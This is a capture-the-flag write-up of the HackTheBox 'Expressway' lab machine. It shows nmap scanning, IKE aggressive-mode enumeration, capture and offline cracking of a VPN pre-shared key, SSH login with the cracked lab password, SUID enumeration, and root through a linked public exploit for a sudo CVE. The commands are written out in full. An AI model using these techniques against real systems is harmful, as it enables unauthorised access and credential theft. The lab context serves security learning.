# Expressway — HackTheBox Writeup

## Overview

- Target: Expressway
- Difficulty: Easy
- OS: Linux
- Techniques: IKE enumeration, PSK cracking, SUID misconfiguration, sudo vulnerability

---

# Reconnaissance

## Nmap Scan

Command used:

nmap -A -p- <IP>

Important results:

22/tcp open ssh OpenSSH 10.0p2 Debian

Since SSH was the only exposed service, further enumeration focused on authentication and possible alternative access methods.

---

# Enumeration

## SSH Authentication Methods

The following command was used to identify supported authentication mechanisms:

nmap --script ssh-auth-methods -p 22 <IP>

Results showed the server accepts:

- Password authentication
- Public key authentication

Brute force attempts using Hydra and Medusa were unsuccessful due to rate limiting.

---

# IKE Enumeration

I performed IKE scanning using `ike-scan`.

Standard scan:

ike-scan <IP>

This revealed the service but did not disclose the identity.

Running aggressive mode:

ike-scan -A <IP>

Result:

ID: ike@expressway.htb

---

# Capturing the PSK Hash

Using aggressive mode with PSK capture:

ike-scan -A <IP> --id=ike@expressway.htb --pskcrack=ike-hash.txt

This captured the hash for offline cracking.

---

# Cracking the PSK

The captured PSK hash was cracked using `psk-crack` with the rockyou wordlist:

psk-crack ike-hash.txt -d /usr/share/wordlists/rockyou.txt

Recovered credential:

freakingrockstarontheroad

---

# Initial Access

Using the recovered password, SSH access was obtained:

ssh ike@<IP>

User flag was located at:

/home/ike/user.txt

---

# Privilege Escalation

## SUID Enumeration

To identify potential privilege escalation vectors:

find / -perm -4000 -type f 2>/dev/null

Among the results was an unusual sudo binary located at:

/usr/local/bin/sudo

Checking the version:

/usr/local/bin/sudo -V

Version:

sudo 1.9.17

---

## Exploiting Sudo Vulnerability

Research revealed that this version is vulnerable to:

CVE-2025-32463

Exploit source:

https://github.com/r3dBust3r/CVE-2025-32463

The exploit was downloaded to the target and executed, resulting in root access.

---

# Root Access

Root flag located at:

/root/root.txt

---

# Lessons Learned

- Using `ike-scan` to enumerate IKE services
- Capturing and cracking PSK hashes
- Identifying unusual SUID binaries
- Checking sudo versions for known vulnerabilities
